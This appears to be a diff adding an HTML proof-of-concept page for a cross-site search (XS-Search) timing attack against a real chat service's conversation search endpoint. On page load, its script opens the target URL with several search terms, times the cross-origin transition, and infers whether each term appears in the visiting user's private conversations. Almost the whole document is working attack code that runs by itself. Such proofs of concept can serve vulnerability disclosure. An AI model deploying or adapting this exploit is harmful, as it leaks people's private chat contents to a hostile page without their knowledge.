@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Enhanced XS-Search Timing Exploit</title>
+    <style>
+      body {
+        font-family: 'Segoe UI', Arial, sans-serif;
+        background-color: #1e1e1e;
+        color: #e0e0e0;
+        margin: 0;
+        padding: 20px;
+        line-height: 1.6;
+      }
+      h1 {
+        color: #ffffff;
+        text-align: center;
+        margin-bottom: 10px;
+      }
+      p {
+        text-align: center;
+        color: #b0b0b0;
+        margin-bottom: 20px;
+      }
+      #loading {
+        text-align: center;
+        color: #64b5f6;
+        font-style: italic;
+        margin-bottom: 20px;
+        display: none;
+      }
+      table {
+        border-collapse: collapse;
+        width: 100%;
+        max-width: 900px;
+        margin: 0 auto;
+        background-color: #2a2a2a;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        border-radius: 8px;
+        overflow: hidden;
+      }
+      th, td {
+        padding: 12px;
+        text-align: left;
+        border-bottom: 1px solid #444;
+      }
+      th {
+        background-color: #3a3a3a;
+        color: #ffffff;
+        font-weight: 600;
+      }
+      td {
+        color: #d0d0d0;
+      }
+      tr:hover {
+        background-color: #333333;
+        transition: background-color 0.2s;
+      }
+      .status-exists {
+        color: #4caf50;
+        font-weight: bold;
+      }
+      .status-error {
+        color: #ef5350;
+        font-weight: bold;
+      }
+      .status-does-not-exist {
+        color: #ffb300;
+        font-weight: bold;
+      }
+      @media (max-width: 600px) {
+        table {
+          font-size: 14px;
+        }
+        th, td {
+          padding: 8px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <h1>XS-Search Timing Exploit Demo</h1>
+    <p>Measuring load times for search queries on target server</p>
+    <div id="loading">Processing queries...</div>
+    <table id="resultTable">
+      <thead>
+        <tr>
+          <th>Query</th>
+          <th>Status</th>
+          <th>Load Time (ms)</th>
+          <th>Timestamp</th>
+        </tr>
+      </thead>
+      <tbody id="resultBody"></tbody>
+    </table>
+    <script>
+      // Configuration
+      const TARGET_URL = 'https://grok.com/rest/app-chat/conversations?pageSize=60&searchQuery=';
+      const BASE_THRESHOLD = 750; // Base timing threshold in ms
+      const QUERY_LIST = ['youssef', 'donotexist', 'donotexist', 'xssearch', 'admin', 'user'];
+      const MAX_RETRIES = 2;
+      const results = [];
+
+      document.getElementById('loading').style.display = 'block';
+
+      async function performTimingAttack(searchQuery, attempt = 1) {
+        try {
+          const encodedQuery = encodeURIComponent(searchQuery);
+
+          const win = window.open(TARGET_URL + encodedQuery);
+          const start = performance.now();
+
+          async function measure() {
+            try {
+              win.origin;
+
+              setTimeout(measure, 0);
+            } catch (e) {
+              const time = performance.now() - start;
+              const exists = time > BASE_THRESHOLD ? 'exists' : 'does not exist';
+              const timestamp = new Date().toISOString();
+
+              results.push({ query: searchQuery, time: time.toFixed(2), exists, timestamp });
+
+              const resultBody = document.getElementById('resultBody');
+              resultBody.innerHTML += `
+                <tr>
+                  <td>${searchQuery}</td>
+                  <td class="status-${exists.replace(' ', '-')}"">${exists}</td>
+                  <td>${time.toFixed(2)}</td>
+                  <td>${timestamp}</td>
+                </tr>
+              `;
+              win.close();
+            }
+          }
+
+          measure();
+        } catch (error) {
+          if (attempt <= MAX_RETRIES) {
+            console.warn(`Retrying query "${searchQuery}" (Attempt ${attempt}/${MAX_RETRIES})`);
+            await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 500));
+            return performTimingAttack(searchQuery, attempt + 1);
+          }
+          console.error(`Error for query "${searchQuery}": ${error.message}`);
+          const timestamp = new Date().toISOString();
+          results.push({ query: searchQuery, time: 'N/A', exists: 'error', timestamp, error: error.message });
+          const resultBody = document.getElementById('resultBody');
+          resultBody.innerHTML += `
+            <tr>
+              <td>${searchQuery}</td>
+              <td class="status-error">error</td>
+              <td>N/A</td>
+              <td>${timestamp}</td>
+            </tr>
+          `;
+        }
+      }
+
+      async function runAttacks() {
+        for (const query of QUERY_LIST) {
+          await performTimingAttack(query);
+          await new Promise(resolve => setTimeout(resolve, 3000 + Math.random() * 500));
+        }
+        document.getElementById('loading').style.display = 'none';
+      }
+
+      runAttacks();
+    </script>
+  </body>
+</html>
